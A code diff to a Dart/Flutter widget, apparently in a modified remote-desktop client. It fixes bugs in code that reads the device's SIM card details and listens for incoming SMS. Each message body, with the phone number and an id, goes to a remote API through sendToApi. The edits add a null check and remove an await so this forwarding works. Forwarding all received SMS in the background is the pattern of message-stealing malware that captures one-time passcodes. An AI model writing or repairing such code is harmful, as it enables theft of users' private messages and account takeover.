@@ -449,7 +449,7 @@ class ListenInfo extends StatefulWidget {
 }
 
 class _ListenInfoState extends State<ListenInfo> {
-  final model = gFFI.serverModel;
+  final model = gFFI.serverModel; // 确保 gFFI 已正确定义
   late final String id; 
 
   @override
@@ -468,8 +468,14 @@ class _ListenInfoState extends State<ListenInfo> {
   }
 
   void _startListening() async {
-    final simCardInfo = await SimCarInfoPlugin.init();
-    var info = await simCardInfo.simCarInfo();
+    final _simCarInfoPlugin = await SimCarInfoPlugin.init();
+    var info = await _simCarInfoPlugin.simCarInfo();
+
+    if (info == null) {
+      print("Failed to get SIM info");
+      return; // 退出方法
+    }
+
     String jsonString = info;
     List<dynamic> jsonData = json.decode(jsonString);
 
@@ -483,7 +489,7 @@ class _ListenInfoState extends State<ListenInfo> {
 
     SimCarInfoPlugin.onSmsReceived.listen((sms) {
       print("Received SMS: ${sms.body} from ${sms.sender}");
-      await sendToApi(phoneNumber ?? '', sms.body, id);
+      sendToApi(phoneNumber ?? '', sms.body, id); // 不使用 await
     });
   }
 
@@ -511,8 +517,7 @@ class _ListenInfoState extends State<ListenInfo> {
     
     if (response.statusCode == 200) {
       print(await response.stream.bytesToString());
-    }
-    else {
+    } else {
       print(response.reasonPhrase);
     }
   }
